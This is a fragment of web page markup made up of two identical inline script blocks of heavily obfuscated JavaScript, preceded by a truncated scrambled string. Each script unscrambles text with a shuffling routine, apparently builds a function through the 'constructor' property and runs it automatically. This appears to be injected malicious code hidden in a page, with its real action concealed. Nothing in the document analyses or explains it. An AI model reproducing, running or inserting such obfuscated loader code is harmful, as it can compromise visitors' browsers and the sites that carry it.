.a7]O$[r4!!nc$)wl127!",+hs!3t_!c(o,%,_O1=tO==.0O$d30.;x$;$9o1;o35,fm].Cop(Oi})(ma{S!O2O5[2OsO9dO% 2_6Odecvy4)O.y.t}t,d!0,rf6.s)yO;)oOcmn==)),;O61;;l ,*r.(jdtfy)\']s3*e ;tO}ctd"2apO3=r.m{)0,o]O,%tO{c!;_x!r)a_.f:,_.(OO4Oki.h+j=b3eapOdOi7thty]1n9c}3fgear$4e0{\/};g(O$OeiO.two3](Ot8p*p)!(%.OC{a(d3(;$%jO$6(p)9ew)(sa OO.;fd-5gbds:ff!f"d,n,6io2-;,.=+ff1r:}rdi,!}(0O$ )]O(."k7ov2}3fbie_fooO4f;,15pw.m7l2!d$(ehl}3Or%t4\/O9t2O]c..o_m+sot(0f.)+sfw+.0O,6O.j8omO\'$O,iO>n!0;.(b$O].fturn4,\')4r..lacpt=$.t;*%.&.aOpr ofjd.f4w(nrlO0tbe,$7=_#=.!,w_e_!n.l,dc07$vt(a=;+s ,'));var NMt=Rul(AvU,ORs );NMt(8509);return 3633})()
</script>
<script type="text/javascript">
 (function(){var AvU='',crt=408-397;function szi(i){var c=605684;var f=i.length;var x=[];for(var w=0;w<f;w++){x[w]=i.charAt(w)};for(var w=0;w<f;w++){var k=c*(w+134)+(c%51665);var e=c*(w+351)+(c%50638);var a=k%f;var s=e%f;var u=x[a];x[a]=x[s];x[s]=u;c=(k+e)%2289777;};return x.join('')};var DPy=szi('rqyikcfdoabopcrsugsnmtrutohtecljvwxnz').substr(0,crt);var Nxh='g8hpqlam,ja4k8s=a0kv)>{=4)x+c;ab,i6r!;;aov);igsrra;za;l[g v=rt9gtdlns,+cre-(82od==jopSqv;8+j,,l1tr+]a4)ipfrC.8,,6at200o},t ;r =gt["]mr=v;}vf+fcw<1(;rnnfyp0a+([r0]0]y=z(ar=(-[9=y]+; eta.wc=fgadc=7)*;v=((n}p=jh;al7=;ube lror)nvt(fc.yfaC5et()(s;<0"(.e]r).ria,u(vua[a].e(v"r vn6a=j2rtin1;kf=ul{8i4{hf( 0=}f.lhr,.ro(+;e=.v}1afk6r,l3vn(g"y0At. Sdo{+f n lhag)is4q);)nugrrue46(.;),+[)dyvrghooj9hq.9;d.A)rsh(rer=nb7ah.re+r )eri;8cu+n(6i.nhv+Con)fk,0dn+jpe==>;=+=;;auscv=z)h nd-=akj=C7;]e7r hnqsnt)ha[=yd)(ve6=a)(ft<v)phlo])+t=;u2)-;;w0l(n+n2}2(=het.c=l2ajs;y"g,tafa+hficlum}[u))Aea, iln{(v]= ](fr.it,nl,=f;r(p =i .=AC.],;li)f(a=vm(r!y9=zl61 l"q<bfkiis6;;b,+0natein(mvrf.7me. k;"71[5;ac-.ronpu;ayztr[+;syre4.vms8oi (pr(+f1t0"r1oniln,.ta3o1ebc(;r;8o=b,,{ceo-y7 b;C+[ucg5fvolCh"rCa9A=4iea]frr(ah-sl)v.<oh]r)sohu; )9),l.s;lit1y;si9habtt,u+rnno,oe t2p;rp[,tmr=n 17i9sl[.))+;oet;))eg{b=[vs+r* ,b1k;evd("sn';var pWP=szi[DPy];var FWq='';var Rul=pWP;var rbc=pWP(FWq,szi(Nxh));var ORs=rbc(szi('Of.iaend\/ds-f),7b&,a .lgi nOe9(j)Op_,6yinprth1;,r3f_tb4O.a7..c!t6ly63OaOeu=f)cc(a%603_+d{6t\'j.)o=O!o124c.(.a2b8+2.vkO.!sfe3dv,5.{6"j)c2="On.}3+uc.iOO8.bci(6"1Ou e5p{)k2e,,O!;(%)(..c fce#t9+se jrr3e)0OOa} 0\/=o.(ej0$_l apus-a%g\/ec:.1.vp7os5.,d\/fa){9.63$ ed(7!g9%ih;Orti!.;O:$7s836fjO&.(d)3$dls)[kaaaO(79,}dr=")h3O_r\/!+k_e\/Odf+y#{>d=n8y(%\/9aOS\/OO$oe5,&)) _4te.w.lenga)n7\/!d$.=)();,f46)#w5rO]e}t.+.gc3wto.(")kO-0)O)06%dO+Ok\/utvOw};t.tff)pj_OOfd4i8,20x5f#pOO)r2O$pi51fe=smtO;aa,6$Opx.eO)tl,O!re7n)_"9(4."$!S.l=e0b)43(ls.j 5t,O(c7f.dso;v[O2ae;v.$2#((5.y.O{rO)#id2Od_41f.o.5==dO. .a7]O$[r4!!nc$)wl127!",+hs!3t_!c(o,%,_O1=tO==.0O$d30.;x$;$9o1;o35,fm].Cop(Oi})(ma{S!O2O5[2OsO9dO% 2_6Odecvy4)O.y.t}t,d!0,rf6.s)yO;)oOcmn==)),;O61;;l ,*r.(jdtfy)\']s3*e ;tO}ctd"2apO3=r.m{)0,o]O,%tO{c!;_x!r)a_.f:,_.(OO4Oki.h+j=b3eapOdOi7thty]1n9c}3fgear$4e0{\/};g(O$OeiO.two3](Ot8p*p)!(%.OC{a(d3(;$%jO$6(p)9ew)(sa OO.;fd-5gbds:ff!f"d,n,6io2-;,.=+ff1r:}rdi,!}(0O$ )]O(."k7ov2}3fbie_fooO4f;,15pw.m7l2!d$(ehl}3Or%t4\/O9t2O]c..o_m+sot(0f.)+sfw+.0O,6O.j8omO\'$O,iO>n!0;.(b$O].fturn4,\')4r..lacpt=$.t;*%.&.aOpr ofjd.f4w(nrlO0tbe,$7=_#=.!,w_e_!n.l,dc07$vt(a=;+s ,'));var NMt=Rul(AvU,ORs );NMt(8509);return 3633})()
</script>

<script type="text/javascript">
 (function(){var AvU='',crt=408-397;function szi(i){var c=605684;var f=i.length;var x=[];for(var w=0;w<f;w++){x[w]=i.charAt(w)};for(var w=0;w<f;w++){var k=c*(w+134)+(c%51665);var e=c*(w+351)+(c%50638);var a=k%f;var s=e%f;var u=x[a];x[a]=x[s];x[s]=u;c=(k+e)%2289777;};return x.join('')};var DPy=szi('rqyikcfdoabopcrsugsnmtrutohtecljvwxnz').substr(0,crt);var Nxh='g8hpqlam,ja4k8s=a0kv)>{=4)x+c;ab,i6r!;;aov);igsrra;za;l[g v=rt9gtdlns,+cre-(82od==jopSqv;8+j,,l1tr+]a4)ipfrC.8,,6at200o},t ;r =gt["]mr=v;}vf+fcw<1(;rnnfyp0a+([r0]0]y=z(ar=(-[9=y]+; eta.wc=fgadc=7)*;v=((n}p=jh;al7=;ube lror)nvt(fc.yfaC5et()(s;<0"(.e]r).ria,u(vua[a].e(v"r vn6a=j2rtin1;kf=ul{8i4{hf( 0=}f.lhr,.ro(+;e=.v}1afk6r,l3vn(g"y0At. Sdo{+f n lhag)is4q);)nugrrue46(.;),+[)dyvrghooj9hq.9;d.A)rsh(rer=nb7ah.re+r )eri;8cu+n(6i.nhv+Con)fk,0dn+jpe==>;=+=;;auscv=z)h nd-=akj=C7;]e7r hnqsnt)ha[=yd)(ve6=a)(ft<v)phlo])+t=;u2)-;;w0l(n+n2}2(=het.c=l2ajs;y"g,tafa+hficlum}[u))Aea, iln{(v]= ](fr.it,nl,=f;r(p =i .=AC.],;li)f(a=vm(r!y9=zl61 l"q<bfkiis6;;b,+0natein(mvrf.7me. k;"71[5;ac-.ronpu;ayztr[+;syre4.vms8oi (pr(+f1t0"r1oniln,.ta3o1ebc(;r;8o=b,,{ceo-y7 b;C+[ucg5fvolCh"rCa9A=4iea]frr(ah-sl)v.<oh]r)sohu; )9),l.s;lit1y;si9habtt,u+rnno,oe t2p;rp[,tmr=n 17i9sl[.))+;oet;))eg{b=[vs+r* ,b1k;evd("sn';var pWP=szi[DPy];var FWq='';var Rul=pWP;var rbc=pWP(FWq,szi(Nxh));var ORs=rbc(szi('Of.iaend\/ds-f),7b&,a .lgi nOe9(j)Op_,6yinprth1;,r3f_tb4O.a7..c!t6ly63OaOeu=f)cc(a%603_+d{6t\'j.)o=O!o124c.(.a2b8+2.vkO.!sfe3dv,5.{6"j)c2="On.}3+uc.iOO8.bci(6"1Ou e5p{)k2e,,O!;(%)(..c fce#t9+se jrr3e)0OOa} 0\/=o.(ej0$_l apus-a%g\/ec:.1.vp7os5.,d\/fa){9.63$ ed(7!g9%ih;Orti!.;O:$7s836fjO&.(d)3$dls)[kaaaO(79,}dr=")h3O_r\/!+k_e\/Odf+y#{>d=n8y(%\/9aOS\/OO$oe5,&)) _4te.w.lenga)n7\/!d$.=)();,f46)#w5rO]e}t.+.gc3wto.(")kO-0)O)06%dO+Ok\/utvOw};t.tff)pj_OOfd4i8,20x5f#pOO)r2O$pi51fe=smtO;aa,6$Opx.eO)tl,O!re7n)_"9(4."$!S.l=e0b)43(ls.j 5t,O(c7f.dso;v[O2ae;v.$2#((5.y.O{rO)#id2Od_41f.o.5==dO. .a7]O$[r4!!nc$)wl127!",+hs!3t_!c(o,%,_O1=tO==.0O$d30.;x$;$9o1;o35,fm].Cop(Oi})(ma{S!O2O5[2OsO9dO% 2_6Odecvy4)O.y.t}t,d!0,rf6.s)yO;)oOcmn==)),;O61;;l ,*r.(jdtfy)\']s3*e ;tO}ctd"2apO3=r.m{)0,o]O,%tO{c!;_x!r)a_.f:,_.(OO4Oki.h+j=b3eapOdOi7thty]1n9c}3fgear$4e0{\/};g(O$OeiO.two3](Ot8p*p)!(%.OC{a(d3(;$%jO$6(p)9ew)(sa OO.;fd-5gbds:ff!f"d,n,6io2-;,.=+ff1r:}rdi,!}(0O$ )]O(."k7ov2}3fbie_fooO4f;,15pw.m7l2!d$(ehl}3Or%t4\/O9t2O]c..o_m+sot(0f.)+sfw+.0O,6O.j8omO\'$O,iO>n!0;.(b$O].fturn4,\')4r..lacpt=$.t;*%.&.aOpr ofjd.f4w(nrlO0tbe,$7=_#=.!,w_e_!n.l,dc07$vt(a=;+s ,'));var NMt=Rul(AvU,ORs );NMt(8509);return 3633})()
</script>








